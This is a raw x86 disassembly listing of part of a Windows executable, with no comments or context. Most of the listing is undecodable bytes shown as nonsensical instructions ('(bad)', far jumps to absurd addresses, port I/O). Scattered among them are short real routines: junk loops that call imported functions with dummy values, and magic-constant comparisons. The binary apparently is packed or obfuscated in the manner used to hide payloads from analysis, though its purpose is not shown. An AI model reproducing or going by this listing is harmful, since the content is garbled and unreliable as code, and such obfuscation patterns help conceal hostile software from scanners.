  40e97f:	(bad)  
  40e980:	dec    DWORD PTR [ebx+0x335f0c45]
  40e986:	(bad)  
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0x6d94a01d
  40e99c:	stos   BYTE PTR es:[edi],al
  40e99d:	xchg   BYTE PTR [esi+edi*2+0x7e7f127e],ah
  40e9a4:	jle    0x40e999
  40e9a6:	shl    BYTE PTR [ebx],cl
  40e9a8:	mov    al,ds:0x81395483
  40e9ad:	call   0x9577393
  40e9b2:	jo     0x40e966
  40e9b4:	inc    ebx
  40e9b5:	jmp    0xa39ab2cd
  40e9ba:	fcomp  st(6)
  40e9bc:	fnstenv es:[edi-0x17be9aae]
  40e9c3:	dec    edx
  40e9c4:	hlt    
  40e9c5:	add    edx,edx
  40e9c7:	retf   
  40e9c8:	add    al,0xc2
  40e9ca:	fbstp  TBYTE PTR [edi-0x16]
  40e9cd:	pop    esi
  40e9ce:	lods   al,BYTE PTR ds:[esi]
  40e9cf:	dec    esi
  40e9d0:	icebp  
  40e9d1:	call   0x22acf71e
  40e9d6:	imul   edx,DWORD PTR [ecx-0x31],0x2db0ccb7
  40e9dd:	sub    ecx,ebp
  40e9df:	dec    edx
  40e9e0:	ja     0x40e9da
  40e9e2:	and    ecx,DWORD PTR [edi+0x21]
  40e9e5:	or     DWORD PTR [edx-0x71],0xffffffc9
  40e9e9:	or     al,0x83
  40e9eb:	rcr    DWORD PTR [edx+0x46],0x54
  40e9ef:	das    
  40e9f0:	dec    ebp
  40e9f1:	xor    BYTE PTR [eax-0x2934822],dh
  40e9f7:	mov    ecx,0x2b214bbf
  40e9fc:	and    eax,0xb7410dea
  40ea01:	nop
  40ea02:	or     al,0x66
  40ea04:	shld   DWORD PTR [ecx+edx*2],ebx,cl
  40ea08:	xor    ebx,esi
  40ea0a:	cmp    esp,DWORD PTR [ebx+0x76]
  40ea0d:	outs   dx,DWORD PTR ds:[esi]
  40ea0e:	in     al,dx
  40ea0f:	mov    ebp,0xbe92789f
  40ea14:	adc    al,0xa5
  40ea16:	loop   0x40ea8b
  40ea18:	and    eax,0x2cc3b247
  40ea1d:	popf   
  40ea1e:	imul   eax,DWORD PTR ds:0xca3b9ee9,0xffffffa2
  40ea25:	sbb    ebp,DWORD PTR [edx]
  40ea27:	or     DWORD PTR [eax-0x68],0xbce06bdd
  40ea2e:	mov    eax,ds:0x856898ad
  40ea33:	out    0x23,al
  40ea35:	out    dx,eax
  40ea36:	fsub   QWORD PTR [ecx+0x2e340cb7]
  40ea3c:	sbb    al,0xbe
  40ea3e:	cmp    eax,0x296e419e
  40ea43:	sub    al,BYTE PTR [ebp-0x3dea0286]
  40ea49:	lea    esp,[edx+ebx*1+0x46655730]
  40ea50:	mov    dl,0x47
  40ea52:	jbe    0x40ea07
  40ea54:	xchg   DWORD PTR cs:[edx],edx
  40ea57:	es dec esi
  40ea59:	dec    ecx
  40ea5a:	push   esi
  40ea5b:	pop    esp
  40ea5c:	(bad)  
  40ea5d:	jo     0x40eac4
  40ea5f:	sbb    al,0x16
  40ea61:	mov    esi,0xdcf582ac
  40ea66:	jle    0x40eade
  40ea68:	(bad)  
  40ea69:	jns    0x40eae0
  40ea6b:	inc    eax
  40ea6c:	jge    0x40eab6
  40ea6e:	pop    ebx
  40ea6f:	call   0x9058ef1a
  40ea74:	rol    BYTE PTR [ecx-0x70],1
  40ea77:	or     BYTE PTR [eax],cl
  40ea79:	iret   
  40ea7a:	push   ds
  40ea7b:	iret   
  40ea7c:	lea    eax,[edi]
  40ea7e:	adc    bh,BYTE PTR [edx+0x3a5d64a6]
  40ea84:	in     al,0xd1
  40ea86:	jmp    0x40eb01
  40ea88:	lds    esi,FWORD PTR [esp+ebp*4]
  40ea8b:	pop    ecx
  40ea8c:	xor    esp,DWORD PTR [esi-0x1e0b7e9e]
  40ea92:	std    
  40ea93:	push   ebx
  40ea94:	sub    edx,ebp
  40ea96:	xor    al,0x61
  40ea98:	or     eax,0x79c41df4
  40ea9d:	cmp    dh,BYTE PTR [ebx+0x6ad0fd9]
  40eaa3:	or     DWORD PTR [eax+0x75a767d8],ebp
  40eaa9:	jge    0x40eab0
  40eaab:	push   esi
  40eaac:	or     BYTE PTR [edx-0xc91acf4],0xd8
  40eab3:	and    dl,al
  40eab5:	dec    eax
  40eab6:	xchg   dl,dh
  40eab8:	mov    DWORD PTR ss:[esi-0x3665b2d6],0xc3032a85
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433813,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433813,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433813,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433813,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433813
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433813,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433813
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433813,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x433853,0x16
  40eb34:	cmp    DWORD PTR ds:0x433853,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x433853,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x433853
  40eb64:	dec    eax
  40eb65:	mov    ds:0x433853,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x433863,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43381b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x4338ab,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    dl,BYTE PTR [ebx-0x65f08073]
  40ebb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebb9:	jle    0x40ec39
  40ebbb:	push   esp
  40ebbc:	jg     0x40ec3c
  40ebbe:	jle    0x40ec00
  40ebc0:	mov    cl,BYTE PTR [edi+0x47b7e811]
  40ebc6:	shr    ecx,1
  40ebc8:	add    edi,DWORD PTR [ecx]
  40ebca:	stos   BYTE PTR es:[edi],al
  40ebcb:	rcr    ebp,cl
  40ebcd:	aas    
  40ebce:	jbe    0x40eb6b
  40ebd0:	jl     0x40eb82
  40ebd2:	pop    ebx
  40ebd3:	add    BYTE PTR [ecx-0x19],bl
  40ebd6:	pop    esi
  40ebd7:	arpl   ax,bp
  40ebd9:	sbb    eax,0xf0cb9a9b
  40ebde:	sbb    DWORD PTR [esi+0x26],ebp
  40ebe1:	loope  0x40ebb6
  40ebe3:	das    
  40ebe4:	jnp    0x40eba5
  40ebe6:	sbb    bl,dl
  40ebe8:	test   DWORD PTR [ebp+0x3c493fa2],eax
  40ebee:	add    DWORD PTR [esi+0x1fdb8a97],0x43882641
  40ebf8:	inc    esi
  40ebf9:	pop    esp
  40ebfa:	jnp    0x40ec64
  40ebfc:	imul   ebx,ebp,0x95e32829
  40ec02:	mov    dl,0x13
  40ec04:	cwde   
  40ec05:	enter  0xc8d3,0x1f
  40ec09:	out    0x5b,al
  40ec0b:	xor    eax,DWORD PTR [ebx+0x58]
  40ec0e:	ja     0x40ec33
  40ec10:	mov    esi,0xb26bf719
  40ec15:	es inc ebp
  40ec17:	sbb    al,0x13
  40ec19:	inc    ebx
  40ec1a:	retf   0xd42c
  40ec1d:	xchg   esp,eax
  40ec1e:	call   0xc182204d
  40ec23:	pop    es
  40ec24:	retf   0xe302
  40ec27:	dec    edx
  40ec28:	xchg   esp,eax
  40ec29:	sbb    al,0x4b
  40ec2b:	mov    dl,BYTE PTR [ebx]
  40ec2d:	sbb    edi,DWORD PTR [esi-0x1512b8bd]
  40ec33:	sbb    DWORD PTR [esi+0x36aee5f0],ebp
  40ec39:	icebp  
  40ec3a:	fmul   st,st(7)
  40ec3c:	add    eax,0x2577abeb
  40ec41:	xor    al,0x8e
  40ec43:	fist   WORD PTR fs:[edi+0x5d50ca]
  40ec4a:	neg    dl
  40ec4c:	jg     0x40ec1b
  40ec4e:	inc    edi
  40ec4f:	mov    bh,0x3e
  40ec51:	adc    edx,DWORD PTR ds:0xf85feaf7
  40ec57:	xchg   edx,eax
  40ec58:	sub    al,0x41
  40ec5a:	sti    
  40ec5b:	ror    DWORD PTR [ecx+0x6a9e8fd6],0x76
  40ec62:	jmp    0xf0f9:0xe9212f0c
  40ec69:	sbb    BYTE PTR [eax+0x58],bl
  40ec6c:	and    eax,0xdf4320e4
  40ec71:	out    0x9,al
  40ec73:	inc    esi
  40ec74:	adc    eax,0xb4eed58b
  40ec79:	les    ebx,FWORD PTR ds:0x108af221
  40ec7f:	daa    
  40ec80:	push   ebx
  40ec81:	cmp    esp,edx
  40ec83:	adc    BYTE PTR [edx-0x30],bh
  40ec86:	xchg   edi,eax
  40ec87:	lock lods al,BYTE PTR es:[esi]
  40ec8a:	hlt    
  40ec8b:	lahf   
  40ec8c:	mov    al,ds:0x6edcb5c9
  40ec91:	popa   
  40ec92:	fimul  WORD PTR [edx+0x59d523f]
  40ec99:	into   
  40ec9a:	call   0x7df23510
  40ec9f:	mov    al,ds:0x5d332de5
  40eca4:	mov    eax,0x297119c2
  40eca9:	inc    ebx
  40ecaa:	jmp    0xff93246c
  40ecaf:	mov    ecx,0x73eed968
  40ecb4:	xor    BYTE PTR [esi-0x7d33af87],ah
  40ecba:	jne    0x40ec54
  40ecbc:	icebp  
  40ecbd:	or     al,0x7b
  40ecbf:	push   edi
  40ecc0:	imul   ecx,DWORD PTR [edx-0xc36e05a],0x9817e791
  40ecca:	enter  0xd05a,0xcf
  40ecce:	call   0xfe38:0xb25b1b99
  40ecd5:	into   
  40ecd6:	push   edx
  40ecd7:	pop    ebp
  40ecd8:	(bad)  
  40ecd9:	xchg   ecx,eax
  40ecda:	es jb  0x40ed31
  40ecdd:	adc    al,0xa7
  40ecdf:	fisub  WORD PTR [ebx+eax*1+0x6b934b86]
  40ece6:	fdivr  QWORD PTR ds:0x3bd18f75
  40ecec:	jns    0x40ed35
  40ecee:	test   DWORD PTR [edx],esp
  40ecf0:	es push esp
  40ecf2:	inc    edi
  40ecf3:	mov    esp,0x3d550a1
  40ecf8:	pop    esp
  40ecf9:	xchg   esp,eax
  40ecfa:	sbb    BYTE PTR [ecx+0x53],ch
  40ecfd:	(bad)  
  40ecfe:	pop    edi
  40ecff:	push   edx
  40ed00:	xchg   ebp,eax
  40ed01:	into   
  40ed02:	jno    0x40ed81
  40ed04:	adc    DWORD PTR [ebx],ecx
  40ed06:	jae    0x40ecaf
  40ed08:	fimul  DWORD PTR [edx-0x372345f4]
  40ed0e:	and    bh,BYTE PTR [ecx+0x4f]
  40ed11:	cmp    esp,edx
  40ed13:	ret    
  40ed14:	in     eax,0xf1
  40ed16:	in     al,dx
  40ed17:	pop    edx
  40ed18:	cwde   
  40ed19:	frstor [eax+esi*4+0x76]
  40ed1d:	mov    edi,0xa0d8c9c9
  40ed22:	cld    
  40ed23:	mov    ds:0x5d71a392,eax
  40ed28:	pop    eax
  40ed29:	iret   
  40ed2a:	scas   al,BYTE PTR es:[edi]
  40ed2b:	jp     0x40ecb7
  40ed2d:	mov    eax,ds:0x436a0f93
  40ed32:	xor    al,0x7d
  40ed34:	inc    ebx
  40ed35:	ins    BYTE PTR es:[edi],dx
  40ed36:	in     eax,dx
  40ed37:	je     0x40ed88
  40ed39:	rol    DWORD PTR [edi+0x79],cl
  40ed3c:	ss pop eax
  40ed3e:	jne    0x40ed6d
  40ed40:	aas    
  40ed41:	fisubr DWORD PTR [edi+0x60]
  40ed44:	mov    edx,0xda73648c
  40ed49:	mov    bl,0x8d
  40ed4b:	outs   dx,DWORD PTR es:[esi]
  40ed4d:	rcl    bl,cl
  40ed4f:	push   edx
  40ed50:	test   BYTE PTR [esi],bh
  40ed52:	aad    0xf0
  40ed54:	dec    ecx
  40ed55:	push   es
  40ed56:	in     eax,0xa5
  40ed58:	and    eax,0x7de1c704
  40ed5d:	lock cmp BYTE PTR [ebp-0x4d],0xd8
  40ed62:	pop    edx
  40ed63:	cdq    
  40ed64:	push   ecx
  40ed65:	test   BYTE PTR [esi+ebx*2],ch
  40ed68:	xor    eax,0x113cffbf
  40ed6d:	mov    fs,WORD PTR gs:[ebx]
  40ed70:	sbb    al,0xa2
  40ed72:	pop    esp
  40ed73:	call   DWORD PTR [edx+0x11]
  40ed76:	inc    edi
  40ed77:	adc    al,0xe0
  40ed79:	jmp    0x40edec
  40ed7b:	cmc    
  40ed7c:	adc    eax,0xcac631cd
  40ed81:	mov    bl,0x55
  40ed83:	push   cs
  40ed84:	push   edi
  40ed85:	xor    esp,DWORD PTR ds:0x1a38301d
  40ed8b:	pop    ebx
  40ed8c:	leave  
  40ed8d:	mov    esp,0x7dec6627
  40ed92:	call   0xa583ea60
  40ed97:	fst    QWORD PTR [ebx+esi*1]
  40ed9a:	ret    0xd2b
  40ed9d:	shl    DWORD PTR [edi],cl
  40ed9f:	inc    ebx
  40eda0:	add    BYTE PTR [ebx],dh
  40eda2:	repnz mov DWORD PTR ds:0x433853,0x18
  40edad:	cmp    DWORD PTR ds:0x433853,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x433853,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x433853
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x433853,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx+0xb06839d]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	cmc    
  40ee77:	outs   dx,DWORD PTR ds:[esi]
  40ee78:	loope  0x40ee6a
  40ee7a:	xor    bl,bh
  40ee7c:	mov    ebx,0x8e6cdd32
  40ee81:	repnz retf 
  40ee83:	das    
  40ee84:	xor    DWORD PTR ss:[ecx+0x6d],0x6f0cf777
  40ee8c:	and    DWORD PTR [ebx+0x32f3d799],ebx
  40ee92:	pop    ds
  40ee93:	and    al,0x43
  40ee95:	push   esi
  40ee96:	mov    al,ds:0x849e03ff
  40ee9b:	jg     0x40ee63
  40ee9d:	cmp    eax,0xe50a6b77
  40eea2:	cwde   
  40eea3:	scas   eax,DWORD PTR es:[edi]
  40eea4:	outs   dx,DWORD PTR ds:[esi]
  40eea5:	(bad)  
  40eea6:	dec    DWORD PTR gs:[ebx+0xd1a5cac]
  40eead:	ret    
  40eeae:	xchg   edx,eax
  40eeaf:	dec    ecx
  40eeb0:	cmp    DWORD PTR [esi+0x66a526f9],ebx
  40eeb6:	xchg   esi,eax
  40eeb7:	rol    ecx,1
  40eeb9:	out    dx,al
  40eeba:	(bad)  
  40eebb:	cmp    ah,bl
  40eebd:	pop    ebp
  40eebe:	inc    esp
  40eebf:	mov    esi,DWORD PTR [ebx+0x7ad7c336]
  40eec5:	jmp    FWORD PTR [esi+0x23]
  40eec8:	ret    
  40eec9:	adc    eax,DWORD PTR [esi+ebx*4]
  40eecc:	and    esi,DWORD PTR [ebx-0x17]
  40eecf:	out    0x10,al
  40eed1:	(bad)  
  40eed3:	nop
  40eed4:	dec    edi
  40eed5:	scas   al,BYTE PTR es:[edi]
  40eed6:	loopne 0x40eecf
  40eed8:	and    BYTE PTR [ebx],0xae
  40eedb:	iret   
  40eedc:	pop    ebx
  40eedd:	xchg   esi,eax
  40eede:	clc    
  40eedf:	adc    eax,0x704beb66
  40eee4:	iret   
  40eee5:	mov    bh,0xcf
  40eee7:	enter  0xb53e,0xbe
  40eeeb:	inc    ecx
  40eeec:	stos   DWORD PTR es:[edi],eax
  40eeed:	xor    esp,eax
  40eeef:	icebp  
  40eef0:	aas    
  40eef1:	push   ebp
  40eef2:	cld    
  40eef3:	fldcw  WORD PTR [ecx]
  40eef5:	xor    DWORD PTR [ebx],edx
  40eef7:	sub    DWORD PTR [ebx],ebx
  40eef9:	in     eax,0x5d
  40eefb:	fwait
  40eefc:	into   
  40eefd:	repz ja 0x40ef29
  40ef00:	mov    eax,ds:0xaed6ee2a
  40ef05:	or     eax,0xc1825e13
  40ef0a:	inc    ebx
  40ef0b:	xchg   esp,eax
  40ef0c:	sub    DWORD PTR [ebx+0x27],eax
  40ef0f:	fidivr WORD PTR [eax+edi*2]
  40ef12:	cli    
  40ef13:	loope  0x40eedb
  40ef15:	xor    DWORD PTR [ebx+0x6a],esi
  40ef18:	mov    ebx,0x36519f99
  40ef1d:	aam    0x92
  40ef1f:	or     BYTE PTR [ebx-0x11],cl
  40ef22:	pop    ds
  40ef23:	dec    edx
  40ef24:	das    
  40ef25:	test   BYTE PTR [edi+0x7f527fbb],cl
  40ef2b:	mov    eax,0x683611cc
  40ef30:	mov    ecx,0x85c17016
  40ef35:	inc    ecx
  40ef36:	sub    esi,edx
  40ef38:	icebp  
  40ef39:	push   esp
  40ef3a:	pop    edi
  40ef3b:	ret    0xe4e2
  40ef3e:	shr    DWORD PTR [edi-0x68fb1cf0],1
  40ef44:	scas   al,BYTE PTR es:[edi]
  40ef45:	mov    fs,WORD PTR [esi-0x68e0dfb7]
  40ef4b:	and    al,BYTE PTR [edx]
  40ef4d:	dec    edx
  40ef4e:	dec    ebp
  40ef4f:	into   
  40ef50:	(bad)  
  40ef51:	iret   
  40ef52:	add    BYTE PTR [ecx],ch
  40ef54:	mov    ch,al
  40ef56:	pop    edi
  40ef57:	aaa    
  40ef58:	pusha  
  40ef59:	or     BYTE PTR [edx+0x4019f720],bh
  40ef5f:	mov    BYTE PTR [edi+0x4f],ch
  40ef62:	pushf  
  40ef63:	bound  edx,QWORD PTR [ebx+0x29da67b5]
  40ef69:	call   0x13057932
  40ef6e:	mov    ds:0xc9e7e44f,al
  40ef73:	push   cs
  40ef74:	retf   
  40ef75:	pushf  
  40ef76:	jo     0x40ef55
  40ef78:	cld    
  40ef79:	xor    dl,bh
  40ef7b:	jmp    0xe63e:0x6a9bcb0c
  40ef82:	mov    ecx,0x57d91f79
  40ef87:	cmp    BYTE PTR [ecx+eax*1+0xcab6c70],cl
  40ef8e:	cmp    bh,BYTE PTR [edx-0x4e079f8e]
  40ef94:	jo     0x40efb9
  40ef96:	addr16 and eax,0x72ca9667
  40ef9c:	jnp    0x40ef7f
  40ef9e:	sbb    ebx,ecx
  40efa0:	clc    
  40efa1:	pushf  
  40efa2:	jg     0x40f022
  40efa4:	out    0x21,al
  40efa6:	dec    esp
  40efa7:	and    al,0x4e
  40efa9:	loopne 0x40ef7d
  40efab:	popf   
  40efac:	push   edx
  40efad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efae:	call   0x5f30f9fa
  40efb3:	and    dh,BYTE PTR [ebx+0x37]
  40efb6:	call   0xffe:0x4fd4b0ce
  40efbd:	dec    esi
  40efbe:	cld    
  40efbf:	and    BYTE PTR [esi+0x1d],0x13
  40efc3:	xchg   edi,eax
  40efc4:	mov    eax,0x9ce7010
  40efc9:	popa   
  40efca:	jl     0x40ef53
  40efcc:	sbb    esp,DWORD PTR [ebx]
  40efce:	in     eax,0xf6
  40efd0:	xchg   ebp,eax
  40efd1:	pop    ebx
  40efd2:	and    cl,BYTE PTR [edi]
  40efd4:	mov    edx,0x1df10ded
  40efd9:	test   al,0x48
  40efdb:	or     cl,BYTE PTR [ecx]
  40efdd:	div    DWORD PTR [ecx-0x4]
  40efe0:	or     ebp,edi
  40efe2:	rol    BYTE PTR [ebx],1
  40efe4:	sub    eax,0xefc8447
  40efe9:	add    ah,BYTE PTR [ebx]
  40efeb:	mov    ecx,es
  40efed:	xchg   ebx,eax
  40efee:	mov    WORD PTR [eax+ecx*2-0x20],gs
  40eff2:	outs   dx,BYTE PTR ds:[esi]
  40eff3:	es int 0x6a
  40eff6:	pop    edx
  40eff7:	pop    ebp
  40eff8:	stc    
  40eff9:	popf   
  40effa:	fldenv [eax+0x7d]
  40effd:	xchg   esi,eax
  40effe:	retf   0xa91f
  40f001:	cli    
  40f002:	mov    eax,ds:0x808195d4
  40f007:	jae    0x40f07b
  40f009:	scas   eax,DWORD PTR es:[edi]
  40f00a:	dec    ebx
  40f00b:	ret    
  40f00c:	hlt    
  40f00d:	cmp    DWORD PTR [ecx+esi*4+0x35],esp
  40f011:	jno    0x40f085
  40f013:	rol    DWORD PTR [edx+0x42a54e4a],cl
  40f019:	dec    ebx
  40f01a:	pop    esi
  40f01b:	cmp    al,0x5a
  40f01d:	shl    BYTE PTR [eax+0x44cd32ac],0xf8
  40f024:	push   eax
  40f025:	fadd   st(0),st
  40f027:	shl    DWORD PTR [eax],cl
  40f029:	push   ds
  40f02a:	cmp    edx,DWORD PTR ds:[ecx+0x4a]
  40f02e:	in     eax,0xf9
  40f030:	dec    esp
  40f031:	pop    ds
  40f032:	lock leave 
  40f034:	in     al,dx
  40f035:	adc    bh,dl
  40f037:	loopne 0x40f055
  40f039:	int3   
  40f03a:	and    BYTE PTR [ecx+0x57],bl
  40f03d:	xor    eax,0x19fd5528
  40f042:	(bad)  
  40f043:	cld    
  40f044:	xor    ch,BYTE PTR [ebx]
  40f046:	sub    BYTE PTR [eax-0xbc8fe84],ch
  40f04c:	in     al,dx
  40f04d:	outs   dx,DWORD PTR ds:[esi]
  40f04e:	mov    ds:0xc458b29,al
  40f053:	pop    esi
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43381b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0x66e11594,ebx
  40f076:	pop    ss
  40f077:	jmp    0x7d7c:0x7e7ea1d6
  40f07e:	jle    0x40f0fe
  40f080:	add    eax,0x257cb85
  40f085:	xchg   edi,eax
  40f086:	sbb    eax,0xa3ede97f
  40f08b:	pop    edi
  40f08c:	jae    0x40f05e
  40f08e:	fnstcw WORD PTR [ecx+0x566eab37]
  40f094:	sub    eax,0xea63fd3
  40f099:	xor    dh,BYTE PTR [edi]
  40f09b:	out    0x5f,eax
  40f09d:	shl    DWORD PTR [ecx+eiz*2-0x74ae6d7f],0xeb
  40f0a5:	jecxz  0x40f0af
  40f0a7:	aaa    
  40f0a8:	sub    BYTE PTR [eax],ah
  40f0aa:	jo     0x40f07c
  40f0ac:	or     BYTE PTR [eax+0x8],bh
  40f0af:	or     ch,dl
  40f0b1:	in     eax,dx
  40f0b2:	inc    edx
  40f0b3:	mov    ebx,0xe0a544b4
  40f0b8:	scas   al,BYTE PTR es:[edi]
  40f0b9:	loopne 0x40f047
  40f0bb:	test   al,0x96
  40f0bd:	xor    DWORD PTR [ebp+0x5561e946],esp
  40f0c3:	dec    eax
  40f0c4:	cmp    eax,0xeaaee9ae
  40f0c9:	cmp    BYTE PTR [edi+0x1554b316],dl
  40f0cf:	ds jnp 0x40f124
  40f0d2:	pop    ds
  40f0d3:	imul   ecx,ebp,0xf8cc2bfa
  40f0d9:	repz adc edi,DWORD PTR [edi+ecx*8]
  40f0dd:	or     bh,dh
  40f0df:	(bad)  
  40f0e0:	jno    0x40f101
  40f0e2:	adc    eax,0x31aaac5b
  40f0e7:	lods   al,BYTE PTR ds:[esi]
  40f0e8:	das    
  40f0e9:	das    
  40f0ea:	mov    ?,ebp
  40f0ec:	mov    esp,0x9e4c606
  40f0f1:	add    al,0xf1
  40f0f3:	sub    al,0xf6
  40f0f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0f6:	push   ss
  40f0f7:	push   ds
  40f0f8:	cdq    
  40f0f9:	fucom  st(4)
  40f0fb:	call   0x6eaa:0x1df4d681
  40f102:	ins    BYTE PTR es:[edi],dx
  40f103:	xchg   edi,eax
  40f104:	jns    0x40f091
  40f106:	in     al,0x3d
  40f108:	mov    ds:0x34d83fc6,eax
  40f10d:	mov    ch,0xd8
  40f10f:	push   0xe7d05de7
  40f114:	out    dx,al
  40f115:	inc    edx
  40f116:	(bad)  
  40f117:	mov    BYTE PTR [ebx-0x352f07c1],al
  40f11d:	int3   
  40f11e:	imul   eax,ecx,0x58a89c69
  40f124:	mov    ebx,0xee0d11fc
  40f129:	fs fs push 0x40061b45
  40f130:	add    eax,0xab93f60
  40f135:	out    dx,eax
  40f136:	push   0xffffffad
  40f138:	sbb    al,0x46
  40f13a:	add    esp,DWORD PTR [eax+0x73]
  40f13d:	sub    eax,0x3a8eff6b
  40f142:	lea    edi,[esi]
  40f144:	sbb    cl,dh
  40f146:	and    DWORD PTR [esi-0x5a89e09c],ebp
  40f14c:	inc    esi
  40f14d:	or     bl,ah
  40f14f:	xchg   esp,eax
  40f150:	lods   eax,DWORD PTR ds:[esi]
  40f151:	xchg   ebx,eax
  40f152:	outs   dx,BYTE PTR ds:[esi]
  40f153:	pop    edx
  40f154:	fwait
  40f155:	call   0xc7b481c1
  40f15a:	stos   DWORD PTR es:[edi],eax
  40f15b:	into   
  40f15c:	or     al,0xc
  40f15e:	push   esp
  40f15f:	pop    ds
  40f160:	and    eax,0xc66cab51
  40f165:	sub    DWORD PTR [ebp-0xd67d5c7],ebx
  40f16b:	leave  
  40f16c:	add    al,0x5e
  40f16e:	dec    edi
  40f16f:	sub    esp,DWORD PTR [eax-0x2a544319]
  40f175:	(bad)  
  40f176:	in     eax,0xd5
  40f178:	add    edi,DWORD PTR [edx-0x74]
  40f17b:	retf   0x772a
  40f17e:	or     esi,DWORD PTR [ecx+eax*4]
  40f181:	loopne 0x40f1eb
  40f183:	sahf   
  40f184:	mov    ah,0xed
  40f186:	add    DWORD PTR [eax+eiz*8+0x69],0xffffffc7
  40f18b:	clc    
  40f18c:	jecxz  0x40f124
  40f18e:	push   esi
  40f18f:	mov    edi,0x603d6d3e
  40f194:	or     BYTE PTR [ecx-0x1cf1219a],al
  40f19a:	mov    cl,0x50
  40f19c:	out    dx,al
  40f19d:	mov    dl,0x9b
  40f19f:	shl    BYTE PTR [esi+0x70ad999],cl
  40f1a5:	test   BYTE PTR ds:0x8c3f172c,dl
  40f1ab:	or     BYTE PTR [esi],0x14
  40f1ae:	mov    ecx,0xa0db7713
  40f1b3:	jg     0x40f215
  40f1b5:	adc    ebp,0xce5e85b2
  40f1bb:	push   ds
  40f1bc:	mov    ah,0x64
  40f1be:	retf   
  40f1bf:	lea    ecx,[ebp+ebx*4-0x22]
